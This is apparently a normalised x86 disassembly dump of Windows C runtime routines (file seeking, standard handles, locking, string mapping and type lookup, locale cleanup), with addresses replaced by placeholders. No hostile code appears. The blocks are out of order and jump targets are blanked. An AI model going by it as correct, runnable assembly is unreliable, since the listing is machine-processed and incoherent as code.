add esp 0x14
mov eax edi
jmp r-xdata
cmp [ ebp + 0x1c ] esi
je r-xdata
call sub_2006355
retn
mov [ ebp - 0x4 ] esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x1c ]
push eax
mov eax edi
call sub_200bf04
add esp 0x14
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_200c6c1
mov eax [ ebp - 0x20 ]
cmp eax esi
je r-xdata
mov eax [ ebp + 0x14 ]
and eax 0xfffffe7f
neg eax
sbb eax eax
inc eax
je r-xdata
or [ edi ] 0xffffffff
sub_200c6c1
cmp [ ebp - 0x1c ] esi
je r-xdata
retn
cmp [ ebp - 0x20 ] esi
je r-xdata
push [ edi ]
call sub_200cdd0
pop ecx
mov eax [ edi ]
mov ecx eax
sar ecx 0x5
and eax 0x1f
shl eax 0x6
mov ecx [ ecx * 4 + rw-data ]
lea eax [ ecx + eax + 0x4 ]
and [ eax ] 0xfe
sub_200c6ef
mov edi edi
push ebp
mov ebp esp
push 0x1
push [ ebp + 0x8 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_200c623
add esp 0x18
pop ebp
retn
sub_200c70f
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
xor ebx ebx
cmp [ ebp + 0x10 ] ebx
jne r-xdata
push edi
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_2004235
mov edi [ ebp - 0xc ]
cmp [ edi + 0x8 ] ebx
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp + 0x8 ] ebx
jne r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_20045e9
add esp 0xc
cmp [ ebp - 0x4 ] bl
je r-xdata
pop ebx
leave
retn
push esi
mov esi [ ebp + 0xc ]
cmp esi ebx
jne r-xdata
call sub_2005621
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_2006be9
add esp 0x14
cmp [ ebp - 0x4 ] bl
je r-xdata
pop edi
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
mov eax [ ebp + 0x8 ]
movzx ax [ eax ]
dec [ ebp + 0x10 ]
inc [ ebp + 0x8 ]
movzx ecx ax
movzx eax cl
test [ eax + edi + 0x1d ] 0x4
je r-xdata
call sub_2005621
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_2006be9
add esp 0x14
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
movzx ax [ esi ]
movzx eax ax
movzx edx al
inc esi
test [ edx + edi + 0x1d ] 0x4
je r-xdata
cmp [ ebp + 0x10 ] ebx
jne r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
cmp ax cx
jne r-xdata
cmp [ ebp + 0x10 ] ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov al [ eax ]
cmp al bl
jne r-xdata
movzx eax [ esi ]
xor ecx ecx
test [ eax + edi + 0x1d ] 0x4
je r-xdata
pop esi
sbb eax eax
and eax 0x2
dec eax
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp cx bx
je r-xdata
mov dl [ esi ]
dec [ ebp + 0x10 ]
cmp dl bl
je r-xdata
xor eax eax
jmp r-xdata
shl ecx 0x8
movzx ax al
or cx ax
inc [ ebp + 0x8 ]
movzx ecx cx
xor ecx ecx
jmp r-xdata
movzx eax ax
cmp [ ebp - 0x4 ] bl
je r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
cmp [ ebp + 0x10 ] ebx
jne r-xdata
movzx dx dl
shl eax 0x8
or ax dx
inc esi
xor eax eax
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
jmp r-xdata
sub_200c894
push ebp
mov ebp esp
push ebx
push esi
push edi
push ebp
push 0x0
push 0x0
push r-xdata
push [ ebp + 0x8 ]
call RtlUnwind
pop ebp
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_200c8b4
mov ecx [ esp + 0x4 ]
test [ ecx + 0x4 ] 0x6
mov eax 0x1
je r-xdata
retn
mov eax [ esp + 0x14 ]
mov ecx [ eax - 0x4 ]
xor ecx eax
call sub_2003680
push ebp
mov ebp [ eax + 0x10 ]
mov edx [ eax + 0x28 ]
push edx
mov edx [ eax + 0x24 ]
push edx
call sub_200c8f9
add esp 0x8
pop ebp
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
mov [ edx ] eax
mov eax 0x3
sub_200c8f9
push ebx
push esi
push edi
mov eax [ esp + 0x10 ]
push ebp
push eax
push 0xfffffffe
push sub_200c8b4
push [ fs : 0x0 ]
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x4 ]
mov [ fs : 0x0 ] eax
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x18
pop edi
pop esi
pop ebx
retn
cmp [ esp + 0x2c ] 0xffffffff
je r-xdata
lea esi [ esi + esi * 2 ]
mov ecx [ ebx + esi * 4 ]
mov [ esp + 0xc ] ecx
mov [ eax + 0xc ] ecx
cmp [ ebx + esi * 4 + 0x4 ] 0x0
jne r-xdata
cmp esi [ esp + 0x2c ]
jbe r-xdata
jmp r-xdata
push 0x101
mov eax [ ebx + esi * 4 + 0x8 ]
call sub_200c9a9
mov eax [ ebx + esi * 4 + 0x8 ]
call sub_200c9c8
mov eax [ esp + 0x28 ]
mov ebx [ eax + 0x8 ]
mov esi [ eax + 0xc ]
cmp esi 0xffffffff
je r-xdata
sub_200c9a9
push ebx
push ecx
mov ebx rw-data
mov ecx [ esp + 0xc ]
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x4 ] eax
mov [ ebx + 0xc ] ebp
push ebp
push ecx
push eax
pop eax
pop ecx
pop ebp
pop ecx
pop ebx
retn 0x4
sub_200c9cb
mov edi edi
push ebp
mov ebp esp
inc [ rw-data ]
push 0x1000
call sub_200ba1e
pop ecx
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x8 ] eax
test eax eax
je r-xdata
or [ ecx + 0xc ] 0x4
lea eax [ ecx + 0x14 ]
mov [ ecx + 0x8 ] eax
mov [ ecx + 0x18 ] 0x2
or [ ecx + 0xc ] 0x8
mov [ ecx + 0x18 ] 0x1000
jmp r-xdata
mov eax [ ecx + 0x8 ]
and [ ecx + 0x4 ] 0x0
mov [ ecx ] eax
pop ebp
retn
sub_200ca14
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x10 ]
push edi
push esi
mov [ ebp - 0x4 ] eax
call sub_200ccb9
or edi 0xffffffff
pop ecx
cmp eax edi
jne r-xdata
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x4 ]
push ecx
push [ ebp - 0x8 ]
push eax
call [ SetFilePointer@IAT ]
mov [ ebp - 0x8 ] eax
cmp eax edi
jne r-xdata
call sub_2005621
mov [ eax ] 0x9
mov eax esi
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
lea eax [ eax + esi + 0x4 ]
and [ eax ] 0xfd
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call [ GetLastError@IAT ]
test eax eax
je r-xdata
pop edi
pop esi
leave
retn
push eax
call sub_2005647
pop ecx
jmp r-xdata
mov eax edi
mov edx edi
jmp r-xdata
sub_200ca99
push 0x14
push r--data
call sub_2006310
or esi 0xffffffff
mov [ ebp - 0x24 ] esi
mov [ ebp - 0x20 ] esi
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
xor edi edi
cmp eax edi
jl r-xdata
call sub_2005634
and [ eax ] 0x0
call sub_2005621
mov [ eax ] 0x9
call sub_2005634
mov [ eax ] edi
call sub_2005621
mov [ eax ] 0x9
push edi
push edi
push edi
push edi
push edi
call sub_2006be9
add esp 0x14
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
call sub_2006355
retn
mov eax esi
mov edx esi
jmp r-xdata
mov ecx eax
sar ecx 0x5
lea ebx [ ecx * 4 + rw-data ]
mov esi eax
and esi 0x1f
shl esi 0x6
mov ecx [ ebx ]
movsx ecx [ ecx + esi + 0x4 ]
and ecx 0x1
jne r-xdata
push eax
call sub_200cd30
pop ecx
mov [ ebp - 0x4 ] edi
mov eax [ ebx ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_2005634
mov [ eax ] edi
call sub_2005621
mov [ eax ] 0x9
push edi
push edi
push edi
push edi
push edi
call sub_2006be9
add esp 0x14
or edx 0xffffffff
mov eax edx
jmp r-xdata
call sub_2005621
mov [ eax ] 0x9
call sub_2005634
mov [ eax ] edi
or [ ebp - 0x24 ] 0xffffffff
or [ ebp - 0x20 ] 0xffffffff
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_200ca14
add esp 0x10
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x20 ] edx
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_200cba8
mov eax [ ebp - 0x24 ]
mov edx [ ebp - 0x20 ]
sub_200cbb2
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
push edi
test eax eax
jl r-xdata
call sub_2005621
mov [ eax ] 0x9
call sub_2005634
and [ eax ] 0x0
or eax 0xffffffff
cmp eax [ rw-data ]
jae r-xdata
mov ecx eax
sar ecx 0x5
mov esi eax
and esi 0x1f
lea edi [ ecx * 4 + rw-data ]
mov ecx [ edi ]
shl esi 0x6
cmp [ esi + ecx ] 0xffffffff
jne r-xdata
cmp [ rw-data ] 0x1
push ebx
mov ebx [ ebp + 0xc ]
jne r-xdata
mov eax [ edi ]
mov [ esi + eax ] ebx
xor eax eax
pop ebx
jmp r-xdata
sub eax 0x0
je r-xdata
pop edi
pop esi
pop ebp
retn
push ebx
push 0xfffffff6
dec eax
je r-xdata
push ebx
push 0xfffffff5
jmp r-xdata
dec eax
jne r-xdata
call [ SetStdHandle@IAT ]
push ebx
push 0xfffffff4
jmp r-xdata
sub_200cc33
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
push ebx
xor ebx ebx
cmp ecx ebx
push esi
push edi
jl r-xdata
call sub_2005621
mov [ eax ] 0x9
call sub_2005634
mov [ eax ] ebx
or eax 0xffffffff
cmp ecx [ rw-data ]
jae r-xdata
mov eax ecx
sar eax 0x5
mov esi ecx
lea edi [ eax * 4 + rw-data ]
mov eax [ edi ]
and esi 0x1f
shl esi 0x6
add eax esi
test [ eax + 0x4 ] 0x1
je r-xdata
cmp [ eax ] 0xffffffff
je r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
mov eax [ edi ]
or [ esi + eax ] 0xffffffff
xor eax eax
jmp r-xdata
sub ecx ebx
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
push ebx
push 0xfffffff6
dec ecx
je r-xdata
push ebx
push 0xfffffff5
jmp r-xdata
dec ecx
jne r-xdata
call [ SetStdHandle@IAT ]
push ebx
push 0xfffffff4
jmp r-xdata
sub_200ccb9
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
push esi
xor esi esi
cmp eax esi
jl r-xdata
call sub_2005634
and [ eax ] 0x0
call sub_2005621
mov [ eax ] 0x9
or eax 0xffffffff
pop ebp
retn
call sub_2005634
mov [ eax ] esi
call sub_2005621
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x9
call sub_2006be9
add esp 0x14
or eax 0xffffffff
jmp r-xdata
cmp eax [ rw-data ]
jae r-xdata
pop esi
pop ebp
retn
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
shl eax 0x6
add eax ecx
test [ eax + 0x4 ] 0x1
jne r-xdata
mov eax [ eax ]
sub_200cd30
push 0xc
push r--data
call sub_2006310
mov edi [ ebp + 0x8 ]
mov eax edi
sar eax 0x5
mov esi edi
and esi 0x1f
shl esi 0x6
add esi [ eax * 4 + rw-data ]
mov [ ebp - 0x1c ] 0x1
xor ebx ebx
cmp [ esi + 0x8 ] ebx
jne r-xdata
cmp [ ebp - 0x1c ] ebx
je r-xdata
push 0xa
call sub_2005816
pop ecx
mov [ ebp - 0x4 ] ebx
cmp [ esi + 0x8 ] ebx
jne r-xdata
mov eax [ ebp - 0x1c ]
call sub_2006355
retn
mov eax edi
sar eax 0x5
and edi 0x1f
shl edi 0x6
mov eax [ eax * 4 + rw-data ]
lea eax [ eax + edi + 0xc ]
push eax
call [ EnterCriticalSection@IAT ]
mov [ ebp - 0x4 ] 0xfffffffe
call sub_200cdc7
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call sub_200b9b6
pop ecx
pop ecx
test eax eax
jne r-xdata
inc [ esi + 0x8 ]
mov [ ebp - 0x1c ] ebx
sub_200cdd0
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
shl eax 0x6
lea eax [ ecx + eax + 0xc ]
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
sub_200cdf7
push 0x18
push r--data
call sub_2006310
or [ ebp - 0x1c ] 0xffffffff
xor edi edi
mov [ ebp - 0x24 ] edi
push 0xb
call sub_2005753
pop ecx
test eax eax
jne r-xdata
push 0xb
call sub_2005816
pop ecx
mov [ ebp - 0x4 ] edi
or eax 0xffffffff
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_200cf88
mov eax [ ebp - 0x1c ]
mov esi [ edi * 4 + rw-data ]
test esi esi
je r-xdata
call sub_2006355
retn
push 0x40
push 0x20
call sub_200ba63
pop ecx
pop ecx
mov [ ebp - 0x20 ] eax
test eax eax
je r-xdata
mov [ ebp - 0x20 ] esi
mov eax [ edi * 4 + rw-data ]
add eax 0x800
cmp esi eax
jae r-xdata
lea ecx [ edi * 4 + rw-data ]
mov [ ecx ] eax
add [ rw-data ] 0x20
cmp [ ebp - 0x1c ] 0xffffffff
jne r-xdata
test [ esi + 0x4 ] 0x1
jne r-xdata
shl edi 0x5
mov [ ebp - 0x1c ] edi
mov eax edi
sar eax 0x5
mov ecx edi
and ecx 0x1f
shl ecx 0x6
mov eax [ eax * 4 + rw-data ]
mov [ eax + ecx + 0x4 ] 0x1
push edi
call sub_200cd30
pop ecx
test eax eax
jne r-xdata
mov [ eax + 0x4 ] 0x0
or [ eax ] 0xffffffff
mov [ eax + 0x5 ] 0xa
and [ eax + 0x8 ] 0x0
add eax 0x40
mov [ ebp - 0x20 ] eax
jmp r-xdata
inc edi
jmp r-xdata
add esi 0x40
jmp r-xdata
cmp [ esi + 0x8 ] 0x0
jne r-xdata
or [ ebp - 0x1c ] 0xffffffff
mov edx [ ecx ]
add edx 0x800
cmp eax edx
jae r-xdata
mov [ ebp - 0x28 ] edi
cmp edi 0x40
jge r-xdata
cmp [ ebp - 0x24 ] 0x0
jne r-xdata
push 0xa
call sub_2005816
pop ecx
xor ebx ebx
inc ebx
mov [ ebp - 0x4 ] ebx
cmp [ esi + 0x8 ] 0x0
jne r-xdata
lea ebx [ esi + 0xc ]
push ebx
call [ EnterCriticalSection@IAT ]
test [ esi + 0x4 ] 0x1
je r-xdata
and [ ebp - 0x4 ] 0x0
call sub_200ceca
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call sub_200b9b6
pop ecx
pop ecx
test eax eax
jne r-xdata
cmp [ ebp - 0x24 ] 0x0
jne r-xdata
push ebx
call [ LeaveCriticalSection@IAT ]
inc [ esi + 0x8 ]
mov [ ebp - 0x24 ] ebx
jmp r-xdata
mov [ esi + 0x4 ] 0x1
or [ esi ] 0xffffffff
sub esi [ edi * 4 + rw-data ]
sar esi 0x6
mov eax edi
shl eax 0x5
add esi eax
mov [ ebp - 0x1c ] esi
sub_200cf91
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
pop ebp
retn
sub eax 0x8
cmp [ eax ] 0xdddd
jne r-xdata
push eax
call sub_200368f
pop ecx
sub_200cfb1
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
xor ebx ebx
push edi
mov esi ecx
cmp [ rw-data ] ebx
jne r-xdata
cmp [ ebp + 0x14 ] ebx
jle r-xdata
push ebx
push ebx
xor edi edi
inc edi
push edi
push r--data
push 0x100
push ebx
call [ LCMapStringW@IAT ]
test eax eax
je r-xdata
mov eax [ rw-data ]
cmp eax 0x2
je r-xdata
mov ecx [ ebp + 0x14 ]
mov eax [ ebp + 0x10 ]
call [ GetLastError@IAT ]
cmp eax 0x78
jne r-xdata
mov [ rw-data ] edi
jmp r-xdata
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x10 ] ebx
cmp [ ebp + 0x8 ] ebx
jne r-xdata
cmp eax ebx
je r-xdata
mov eax [ ebp + 0x14 ]
sub eax ecx
dec eax
cmp eax [ ebp + 0x14 ]
jge r-xdata
inc eax
cmp ecx ebx
jne r-xdata
mov [ rw-data ] 0x2
cmp [ ebp + 0x20 ] ebx
jne r-xdata
mov eax [ esi ]
mov eax [ eax + 0x14 ]
mov [ ebp + 0x8 ] eax
cmp eax 0x1
jne r-xdata
mov [ ebp + 0x14 ] eax
inc eax
dec ecx
cmp [ eax ] bl
je r-xdata
or ecx 0xffffffff
push [ ebp + 0x8 ]
call sub_200e7c7
pop ecx
mov [ ebp - 0x14 ] eax
cmp eax 0xffffffff
jne r-xdata
mov eax [ esi ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x20 ] eax
xor eax eax
jmp r-xdata
mov [ ebp - 0x8 ] ebx
cmp [ ebp + 0x20 ] ebx
jne r-xdata
cmp eax [ ebp + 0x20 ]
je r-xdata
lea esp [ ebp - 0x20 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_2003680
leave
retn
mov esi [ MultiByteToWideChar@IAT ]
xor eax eax
cmp [ ebp + 0x24 ] ebx
push ebx
push ebx
push [ ebp + 0x14 ]
setne al
push [ ebp + 0x10 ]
lea eax [ eax * 8 + 0x1 ]
push eax
push [ ebp + 0x20 ]
call esi
mov edi eax
cmp edi ebx
je r-xdata
mov eax [ esi ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x20 ] eax
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ LCMapStringA@IAT ]
mov esi eax
push ebx
push ebx
lea ecx [ ebp + 0x14 ]
push ecx
push [ ebp + 0x10 ]
push eax
push [ ebp + 0x20 ]
call sub_200e810
add esp 0x18
mov [ ebp - 0xc ] eax
cmp eax ebx
je r-xdata
jle r-xdata
mov eax [ ebp - 0x10 ]
cmp eax ebx
je r-xdata
push [ ebp - 0xc ]
call sub_200368f
pop ecx
mov esi [ LCMapStringA@IAT ]
push ebx
push ebx
push [ ebp + 0x14 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call esi
mov [ ebp - 0x8 ] eax
cmp eax ebx
jne r-xdata
mov [ ebp - 0xc ] ebx
push 0xffffffe0
xor edx edx
pop eax
div edi
cmp eax 0x2
jb r-xdata
mov eax esi
cmp [ ebp + 0x18 ] eax
je r-xdata
jle r-xdata
xor esi esi
jmp r-xdata
push edi
push [ ebp - 0xc ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push 0x1
push [ ebp + 0x20 ]
call esi
test eax eax
je r-xdata
lea eax [ edi + edi + 0x8 ]
cmp eax 0x400
ja r-xdata
push eax
call sub_200368f
pop ecx
xor edi edi
cmp eax 0xffffffe0
ja r-xdata
cmp [ ebp - 0xc ] ebx
je r-xdata
push [ ebp - 0xc ]
call sub_200cf91
mov eax [ ebp - 0x8 ]
pop ecx
jmp r-xdata
mov esi [ LCMapStringW@IAT ]
push ebx
push ebx
push edi
push [ ebp - 0xc ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call esi
mov ecx eax
mov [ ebp - 0x8 ] ecx
cmp ecx ebx
je r-xdata
push eax
call sub_20046f8
pop ecx
cmp eax ebx
je r-xdata
call sub_200e9d0
mov eax esp
cmp eax ebx
je r-xdata
push [ ebp - 0x8 ]
push ebx
push edi
call sub_20039e0
add esp 0xc
push [ ebp - 0x8 ]
push edi
push [ ebp + 0x14 ]
push [ ebp - 0xc ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call esi
mov [ ebp - 0x8 ] eax
cmp eax ebx
jne r-xdata
add eax 0x8
cmp eax 0x400
ja r-xdata
test [ ebp + 0xc ] 0x400
je r-xdata
mov [ ebp - 0xc ] eax
jmp r-xdata
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
push [ ebp + 0x1c ]
lea eax [ ebp - 0x8 ]
push [ ebp + 0x18 ]
push eax
push edi
push [ ebp + 0x20 ]
push [ ebp - 0x14 ]
call sub_200e810
mov esi eax
mov [ ebp - 0x10 ] esi
add esp 0x18
neg esi
sbb esi esi
and esi [ ebp - 0x8 ]
xor esi esi
jmp r-xdata
push eax
call sub_20046f8
pop ecx
cmp eax ebx
je r-xdata
call sub_200e9d0
mov edi esp
cmp edi ebx
je r-xdata
cmp ecx ebx
jle r-xdata
cmp [ ebp + 0x1c ] ebx
je r-xdata
cmp [ ebp - 0xc ] ebx
je r-xdata
add eax 0x8
push edi
call sub_200cf91
pop ecx
jmp r-xdata
mov edi eax
jmp r-xdata
mov [ eax ] 0xdddd
add eax 0x8
mov [ edi ] 0xcccc
add edi 0x8
jmp r-xdata
xor esi esi
push 0xffffffe0
xor edx edx
pop eax
div ecx
cmp eax 0x2
jb r-xdata
cmp ecx [ ebp + 0x1c ]
jg r-xdata
cmp edi ebx
je r-xdata
push [ ebp - 0x8 ]
push esi
push edi
push [ ebp - 0xc ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ LCMapStringW@IAT ]
test eax eax
je r-xdata
lea eax [ ecx + ecx + 0x8 ]
cmp eax 0x400
ja r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push edi
push [ ebp - 0xc ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call esi
jmp r-xdata
push esi
call sub_200cf91
pop ecx
push ebx
push ebx
cmp [ ebp + 0x1c ] ebx
jne r-xdata
push eax
call sub_20046f8
pop ecx
cmp eax ebx
je r-xdata
call sub_200e9d0
mov esi esp
cmp esi ebx
je r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push ebx
push ebx
jmp r-xdata
mov esi eax
jmp r-xdata
mov [ eax ] 0xdddd
add eax 0x8
mov [ esi ] 0xcccc
add esi 0x8
jmp r-xdata
push [ ebp - 0x8 ]
push esi
push ebx
push [ ebp + 0x20 ]
call [ WideCharToMultiByte@IAT ]
mov [ ebp - 0x8 ] eax
cmp esi ebx
je r-xdata
sub_200d356
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_2004235
push [ ebp + 0x28 ]
lea ecx [ ebp - 0x10 ]
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_200cfb1
add esp 0x20
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_200d39b
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
push ebx
push esi
xor ebx ebx
push edi
mov edi ecx
cmp eax ebx
jne r-xdata
cmp eax 0x2
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
xor esi esi
inc esi
push esi
push r--data
push esi
call [ GetStringTypeW@IAT ]
test eax eax
je r-xdata
xor esi esi
cmp [ ebp + 0x1c ] ebx
jne r-xdata
cmp eax ebx
je r-xdata
call [ GetLastError@IAT ]
cmp eax 0x78
jne r-xdata
mov [ rw-data ] esi
jmp r-xdata
cmp [ ebp + 0x18 ] ebx
jne r-xdata
mov eax [ edi ]
mov eax [ eax + 0x14 ]
mov [ ebp + 0x1c ] eax
cmp eax 0x1
jne r-xdata
mov eax [ rw-data ]
push 0x2
pop eax
mov [ rw-data ] eax
jmp r-xdata
mov [ ebp - 0x8 ] ebx
cmp [ ebp + 0x18 ] ebx
jne r-xdata
push [ ebp + 0x1c ]
call sub_200e7c7
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov eax [ edi ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x18 ] eax
xor eax eax
jmp r-xdata
mov esi [ MultiByteToWideChar@IAT ]
xor eax eax
cmp [ ebp + 0x20 ] ebx
push ebx
push ebx
push [ ebp + 0x10 ]
setne al
push [ ebp + 0xc ]
lea eax [ eax * 8 + 0x1 ]
push eax
push [ ebp + 0x18 ]
call esi
mov edi eax
cmp edi ebx
je r-xdata
mov eax [ edi ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x18 ] eax
cmp eax [ ebp + 0x18 ]
je r-xdata
lea esp [ ebp - 0x14 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_2003680
leave
retn
jle r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebp + 0x1c ]
call [ GetStringTypeA@IAT ]
mov edi eax
cmp esi ebx
je r-xdata
push ebx
push ebx
lea ecx [ ebp + 0x10 ]
push ecx
push [ ebp + 0xc ]
push eax
push [ ebp + 0x18 ]
call sub_200e810
mov esi eax
add esp 0x18
cmp esi ebx
je r-xdata
test ebx ebx
je r-xdata
cmp edi 0x7ffffff0
ja r-xdata
mov eax edi
push esi
call sub_200368f
pop ecx
mov [ ebp + 0xc ] esi
lea eax [ edi + edi ]
push eax
push 0x0
push ebx
call sub_20039e0
add esp 0xc
push edi
push ebx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push 0x1
push [ ebp + 0x18 ]
call esi
test eax eax
je r-xdata
lea eax [ edi + edi + 0x8 ]
cmp eax 0x400
ja r-xdata
push ebx
call sub_200cf91
mov eax [ ebp - 0x8 ]
pop ecx
jmp r-xdata
push [ ebp + 0x14 ]
push eax
push ebx
push [ ebp + 0x8 ]
call [ GetStringTypeW@IAT ]
mov [ ebp - 0x8 ] eax
push eax
call sub_20046f8
pop ecx
cmp eax ebx
je r-xdata
call sub_200e9d0
mov eax esp
cmp eax ebx
je r-xdata
mov ebx eax
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
add eax 0x8
sub_200d555
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_2004235
push [ ebp + 0x24 ]
lea ecx [ ebp - 0x10 ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_200d39b
add esp 0x1c
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_200d597
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
push [ esi + 0x4 ]
call sub_200368f
push [ esi + 0x8 ]
call sub_200368f
push [ esi + 0xc ]
call sub_200368f
push [ esi + 0x10 ]
call sub_200368f
push [ esi + 0x14 ]
call sub_200368f
push [ esi + 0x18 ]
call sub_200368f
push [ esi ]
call sub_200368f
push [ esi + 0x20 ]
call sub_200368f
push [ esi + 0x24 ]
call sub_200368f
push [ esi + 0x28 ]
call sub_200368f
push [ esi + 0x2c ]
call sub_200368f
push [ esi + 0x30 ]
call sub_200368f
push [ esi + 0x34 ]
call sub_200368f
push [ esi + 0x1c ]
call sub_200368f
push [ esi + 0x38 ]
call sub_200368f
push [ esi + 0x3c ]
call sub_200368f
add esp 0x40
push [ esi + 0x40 ]
call sub_200368f
push [ esi + 0x44 ]
call sub_200368f
push [ esi + 0x48 ]
call sub_200368f
push [ esi + 0x4c ]
call sub_200368f
push [ esi + 0x50 ]
call sub_200368f
push [ esi + 0x54 ]
call sub_200368f
push [ esi + 0x58 ]
call sub_200368f
push [ esi + 0x5c ]
call sub_200368f
push [ esi + 0x60 ]
call sub_200368f
push [ esi + 0x64 ]
call sub_200368f
push [ esi + 0x68 ]
call sub_200368f
push [ esi + 0x6c ]
call sub_200368f
push [ esi + 0x70 ]
call sub_200368f
push [ esi + 0x74 ]
call sub_200368f
push [ esi + 0x78 ]
call sub_200368f
push [ esi + 0x7c ]
call sub_200368f
add esp 0x40
push [ esi + 0x80 ]
call sub_200368f
push [ esi + 0x84 ]
call sub_200368f
